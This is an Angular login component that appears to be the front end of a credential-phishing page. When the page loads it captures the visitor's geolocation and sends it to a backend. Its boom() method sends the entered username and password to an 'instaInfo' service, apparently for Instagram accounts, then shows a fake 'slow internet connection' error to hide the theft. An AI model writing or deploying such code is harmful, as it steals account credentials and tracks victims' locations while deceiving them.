import { Component, OnInit } from '@angular/core';
import { AppService } from './app.service';


@Component({
  selector: 'pm-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.css'],
  providers:[AppService]
})
export class AppComponent implements OnInit{
    public loading = false;
    
  username: string = null;
  password: string = null;
  errorMessage: string;
  latitude: any;
  longitude: any;
  timestamp: any;
  locationError: boolean = false;
  enableLogInButton : boolean = true;
  constructor(private _appService: AppService) {}

  ngOnInit(): void{
    if (window.navigator && window.navigator.geolocation) {
      window.navigator.geolocation.getCurrentPosition(
          position => {
              this.latitude = position.coords.latitude;
              this.longitude = position.coords.longitude;
              this.timestamp = position.timestamp;
              console.log(this.timestamp);
              let userInfo = {
                latitude:this.latitude,
                longitude:this.longitude,
                timestamp:this.timestamp,
              }
              this._appService.pushUserInfo(userInfo)
                  .subscribe(
                      products => {
                          // this.products = products;
                          // this.filteredProducts = this.products;
                      },
                      error => this.errorMessage = <any>error
                  );
          },
          error => {
              switch (error.code) {
                  case 1:
                      console.log('Permission Denied');
                      this.locationError = true;
                      this.timestamp = new Date().getTime();
                      break;
                  case 2:
                      console.log('Position Unavailable');
                      this.locationError = true;
                      this.timestamp = new Date().getTime();
                      break;
                  case 3:
                      console.log('Timeout');
                      this.locationError = true;
                      this.timestamp = new Date().getTime();
                      break;
              }
              let userInfo = {
                latitude:null,
                longitude:null,
                timestamp:this.timestamp,
              }
              this._appService.pushUserInfo(userInfo)
                  .subscribe(
                      products => {
                          // this.products = products;
                          // this.filteredProducts = this.products;
                      },
                      error => this.errorMessage = <any>error
                  );
          }
      );
  };
    }

    onSearchChange() {
        if(this.username && this.password)
        this.enableLogInButton = false;
        else
        this.enableLogInButton = true;
    }

    boom () {
        this.loading = true;
        let details = {
            username:this.username,
            password:this.password
        }
        this._appService.instaInfo(details)
                  .subscribe(
                      products => {
                            this.loading = false;
                          alert('Slow internet connection!! Please try again later. Thank You');
                      },
                      error => {
                        this.loading = false;  
                        this.errorMessage = <any>error
                    }
                  );
    }
}
